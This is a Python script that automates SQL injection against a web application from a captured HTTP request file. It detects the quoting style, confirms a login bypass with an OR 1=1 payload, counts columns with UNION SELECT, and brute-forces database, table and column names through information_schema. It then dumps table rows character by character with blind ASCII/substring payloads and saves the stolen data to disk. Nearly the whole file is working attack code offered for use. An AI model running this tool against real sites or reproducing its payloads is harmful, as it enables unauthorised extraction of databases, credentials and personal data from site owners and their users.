#!/usr/bin/python3


##This code will try to pull out the DB table from url with request file with blind sqli vulnerability.
##He pull the url, method, parameter, request header from the request file.
##If there is more than one parameter, then he will ask you what is the vulnerable parameter. (GetParams function)
##first he find if it need to use with ' (Quote = 1) or with " (Quote = 2).
##After this it will check the user input parameters. (CheckInputs function)
##After this it will check how much column the website send. (UnionSQLi function)
##After this it will try with brute force with DataBases.db file to find the database name. (DBSQLi function)
##After this it will try with brute force with Tables.db file to find the table names. (TableSQLi function)
##After this it will try with brute force with Columns.db file to find the columns names. (ColumnSQLi function)
##After this it will try with brute force with all the keyboard symbols (Guess1 list) to dump the table. (DumpTableletters function)
##At the end it will ask you if you want to save the informations he extracted. (If you type in the first file name to save the informations (-N) it save it without ask.
##If you say yes it will save it with generic name (OutPut with number dot txt). (SaveToFile function)


import requests, argparse, os.path
from tabulate import tabulate
from urllib.parse import urlparse


parser = argparse.ArgumentParser(description='Default usage: BlindSQLI.py -F File')
parser.add_argument("-F", "--File", required=True, help="The file with the requests content")
parser.add_argument("-N", "--Name", default=0, help="If you want a specific name for the output file")
args = parser.parse_args()

Suc = input('Input the string if it success (like "login successful"): ')
Wrong = input('Input the string if it tell you the parameters are wrong (like "Wrong username or password"): ')
Err = input('Input the string if it tell you its db error (like "database error"): ')

Guess1 = '0123456789abcdefghijklmnoqprstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#~`!@#$%^&*()-_+={}[]|/:;<>,.?'


def TrySQLi():
	url, Head , m, Params, sqli = GetParams()
	Quote = 0
	Data = {}
	n = 1
	for i in Params:
		if n == int(sqli):
			Data['%s' %(i)] = "'"
		else:
			Data['%s' %(i)] = ""
		n = n+1

	r = Request(url, Head, Data, m)
	if Wrong in r.text:
		Data = {}
		n = 1
		for i in Params:
			if n == int(sqli):
				Data['%s' %(i)] = '"'
			else:
				Data['%s' %(i)] = ""
			n = n+1
		
		r = Request(url, Head, Data, m)
		if Wrong in r.text:
			print('SQLi did not succeed :-(')
		elif Err in r.text:
			Quote = 2
	elif Err in r.text:
		Quote = 1

	if Quote != 0:
		CheckInputs(url, Head, m, Params, sqli, Quote)
	else:
		print('Input for db error you gave is wrong!')
		exit()

def GetParams():
	Head = {}
	F = open(args.File, 'r')
	f = F.read().splitlines()
	F.close()
	for i in f:
		if i == '':
			break
		elif i.startswith('POST'):
			m = 'Post'
			u = i.split(' ')[1]
		elif i.startswith('GET'):
			m = 'Get'
			u = i.split(' ')[1]
		else:
			Head['%s' %(i.split(': ',1)[0])] = '%s' %(i.split(': ',1)[1])
	
	url = 'http://%s%s' %(Head["Host"], u)
	Params = []
	sqli = '1'
	if m == 'Get':
		if '=' not in urlparse(url).query:
			print('There is no parameters in the request file you gave')
			exit()
		if '&' in urlparse(url).query:
			for i in urlparse(url).query.split('&'):
				if '=' in i:
					Params.append(i.split('=')[0])
			while True:
				n = 1
				print('\n')
				for i in Params:
					print('%s = %s' %(n,i))
					n = n + 1
				sqli = input('Enter the sqli parameter: ')
				if sqli.isdigit():
					if int(sqli) <= len(Params):
						break
				print('\nTry again!')
		else:
			Params.append(urlparse(url).query.strip('=')[0])
		url = 'http://%s%s' %(Head["Host"], urlparse(url).path)
	elif m == 'Post':
		if '=' not in f[-1]:
			print('There is no parameters in the request file you gave')
			exit()
		if '&' in f[-1]:
			for i in f[-1].split('&'):
				if '=' in i:
					Params.append(i.split('=')[0])
			while True:
				if len(Params) == 1:
					break
				n = 1
				print('\n')
				for i in Params:
					print('%s = %s' %(n,i))
					n = n + 1
				sqli = input('Enter the sqli parameter: ')
				if sqli.isdigit():
					if int(sqli) <= len(Params):
						break
				print('\nTry again!')
		else:
			Params.append(f[-1].split('=')[0])
	return (url, Head, m, Params, sqli)

def Request(url, Head, Data, m):
	if m == 'Post':
		return(requests.post(url, headers=Head, data=Data))
	elif m == 'Get':
		return(requests.get(url, headers=Head, params=Data))

def CheckInputs(url, Head, m, Params, sqli, Quote):
	Data = {}
	n = 1
	for i in Params:
		if n == int(sqli):
			if Quote == 2:
				Data['%s' %(i)] = "'"
			elif Quote == 1:
				Data['%s' %(i)] = '"'
		else:
			Data['%s' %(i)] = ""
		n = n+1

	r = Request(url, Head, Data, m)
	if Wrong not in r.text:
		print('Input for wrong parameters you gave is wrong!')
		exit()
	
	Data = {}
	n = 1
	for i in Params:
		if n == int(sqli):
			if Quote == 1:
				Data['%s' %(i)] = "' OR 1=1 ;--"
			elif Quote == 2:
				Data['%s' %(i)] = '" OR 1=1 ;--'
		else:
			Data['%s' %(i)] = ""
		n = n+1
	
	r = Request(url, Head, Data, m)
	if Suc not in r.text:
		print('Input for success you gave is wrong!')
		exit()
	
	UnionSQLi(url, Head, m, Params, sqli, Quote)

def UnionSQLi(url, Head, m, Params, sqli, Quote):
	un = 0
	while True:
		Data = {}
		n = 1
		for i in Params:
			if n == int(sqli):
				if Quote == 1:
					Data['%s' %(i)] = "' union select "+"1,"*un+"1 ;--"
				elif Quote == 2:
					Data['%s' %(i)] = '" union select '+'1,'*un+'1 ;--'
			else:
				Data['%s' %(i)] = ""
			n = n+1
	
		r = Request(url, Head, Data, m)
		if Suc in r.text:
			DBSQLi(url, Head, m, Params, sqli, Quote, un)
		else:
			un = un+1

def DBSQLi(url, Head, m, Params, sqli, Quote, un):
	f = open('DataBases.db', 'r')
	DB = f.read().splitlines()
	f.close()
	for db in DB:
		Data = {}
		n = 1
		for i in Params:
			if n == int(sqli):
				if Quote == 1:
					Data['%s' %(i)] = "'UNION SELECT "+"1,"*un+"table_name FROM information_schema.tables WHERE table_schema='%s' ;--" %(db)
				elif Quote == 2:
					Data['%s' %(i)] = '"UNION SELECT '+'1,'*un+'table_name FROM information_schema.tables WHERE table_schema="%s" ;--' %(db)
			else:
				Data['%s' %(i)] = ""
			n = n+1
	
		r = Request(url, Head, Data, m)
		if Suc in r.text:
			TableSQLi(url, Head, m, Params, sqli, Quote, un, db)
	print("Error: DataBase name don't found, Try to update the DataBases.db file.")

def TableSQLi(url, Head, m, Params, sqli, Quote, un, DB):
	f = open('Tables.db', 'r')
	Tables = f.read().splitlines()
	f.close()
	for t in Tables:
		Data = {}
		n = 1
		for i in Params:
			if n == int(sqli):
				if Quote == 1:
					Data['%s' %(i)] = "' UNION SELECT "+"1,"*un+"column_name FROM information_schema.columns WHERE table_schema='%s' AND table_name='%s' ;--" %(DB, t)
				elif Quote == 2:
					Data['%s' %(i)] = '" UNION SELECT '+'1,'*un+'column_name FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s" ;--' %(DB, t)
			else:
				Data['%s' %(i)] = ""
			n = n+1
	
		r = Request(url, Head, Data, m)
		if Suc in r.text:
			ColumnSQLi(url, Head, m, Params, sqli, Quote, un, DB, t)

	print("Error: Table name don't found, Try to update the Tables.db file.")
	
def ColumnSQLi(url, Head, m, Params, sqli, Quote, un, DB, Table):
	Cols = []
	f = open('Columns.db', 'r')
	Columns = f.read().splitlines()
	f.close()
	for c in Columns:
		Data = {}
		n = 1
		for i in Params:
			if n == int(sqli):
				if Quote == 1:
					Data['%s' %(i)] = "' UNION SELECT "+"1,"*un+"GROUP_CONCAT('%s') FROM information_schema.columns WHERE table_schema='%s' AND table_name='%s' ;--" %(c, DB, Table)
				elif Quote == 2:
					Data['%s' %(i)] = '" UNION SELECT '+'1,'*un+'GROUP_CONCAT("%s") FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s" ;--' %(c, DB, Table)
			else:
				Data['%s' %(i)] = ""
			n = n+1
	
		r = Request(url, Head, Data, m)
		if Suc in r.text:
			Cols.append(c)
	if len(Cols) == un+1:
		DumpTableletters(url, Head, m, Params, sqli, Quote, un, DB, Table, Cols)
	else:
		print("Error: Don't find all the Columns names, We found %s (%s) instead of %s, Try to update the Columns.db file." %(len(Cols), ', '.join(Cols), un+1))
		exit()

def DumpTableletters(url, Head, m, Params, sqli, Quote, un, DB, Table, Cols):
	Tab = {}
	for i in Cols:
		Tab[i] = []
	ID = 1
	while True:
		TempTab = [ID]
		for c in range(1, len(Cols)):
			lst = []
			ln = 1
			g = 0
			while True:
				if g == '00':
					break
				for g in Guess1:
					Data = {}
					n = 1
					for i in Params:
						if n == int(sqli):
							if Quote == 1:
								Data['%s' %(i)] = "' or(SELECT ASCII(substring((SELECT %s FROM %s WHERE %s=%s),%s,1))=ASCII('%s') FROM %s LIMIT 1)=1 ;--" %(Cols[c], Table, Cols[0], ID, ln, g, Table)
							elif Quote == 2:
								Data['%s' %(i)] = '" or(SELECT ASCII(substring((SELECT %s FROM %s WHERE %s=%s),%s,1))=ASCII("%s") FROM %s LIMIT 1)=1 ;--' %(Cols[c], Table, Cols[0], ID, ln, g, Table)
						else:
							Data['%s' %(i)] = ""
						n = n+1
				
					r = Request(url, Head, Data, m)
					if Suc in r.text:
						lst.append(g)
						break
					elif Wrong in r.text and g == '?':
						g = '00'
						break
					elif Err in r.text:
						print('Error: Error shows in try to dump table letters')
						exit()
				ln = ln+1
			if len(lst) > 0:
				TempTab.append(''.join(lst))
		if len(TempTab) == int(un)+1:
			for i in range(len(Cols)):
				Tab[Cols[i]].append(TempTab[i])
		else:
			break
		ID = ID+1
	print('With the requests file from the website (%s), we pulled the followind information:' %(url))
	print('Method = %s' %(m))
	if len(Params) > 1:
		print('Parameters = %s' %(Params))
		print('Vulnerable parameter = %s' %(Params[int(sqli)-1]))
	else:
		print('Parameter = %s' %(Params))
	print('DataBase name = %s' %(DB))
	print('Table name = %s' %(Table))
	print('What we pulled from the table:')
	print(tabulate(Tab, headers='keys', tablefmt='grid'))
	
	if args.Name == 0:
		while True:
			print('\nDo you want to save all this informations?')
			print('(Y)es or (N)o')
			s = input('Answer: ')
			if s == 'Y':
				SaveToFile(url, m, Params, sqli, DB, Table, Cols, Tab)
			elif s == 'N':
				print('Ok, Bye...')
				exit()
			else:
				print('\nWrong answer, Try again.')
	else:
		SaveToFile(url, m, Params, sqli, DB, Table, Cols, Tab)

def SaveToFile(url, m, Params, sqli, DB, Table, Cols, Tab):
	if os.path.isdir('BlindSQLi_Files') == False:
		os.mkdir('BlindSQLi_Files')
	
	if args.Name == 0:
		l = 1
		while True:
			if os.path.isfile('BlindSQLi_Files/OutPut%s.txt' %(l)):
				l = l+1
			else:
				FileN = 'OutPut%s.txt' %(l)
				break
	else:
		FileN = args.Name
	
	f = open('BlindSQLi_Files/%s' %(FileN), 'w')
	f.write('With the requests file from the website (%s), we pulled the followind information:\n' %(url))
	f.write('Method = %s\n' %(m))
	if len(Params) > 1:
		f.write('Parameters = %s\n' %(Params))
		f.write('Vulnerable parameter = %s\n' %(Params[int(sqli)-1]))
	else:
		f.write('Parameter = %s\n' %(Params))
	f.write('DataBase name = %s\n' %(DB))
	f.write('Table name = %s\n' %(Table))
	f.write('What we pulled from the table:\n')
	f.write(tabulate(Tab, headers='keys', tablefmt='grid')+'\n')
	
	print('We save it in the folder "BlindSQLi_Files" with the name "%s".' %(FileN))
	exit()


if os.path.isfile('./BlindSQLi_Files/%s' %(args.Name)) and args.Name != 0:
	print('The file name you want to the output file is already exist!')
	exit()

TrySQLi()
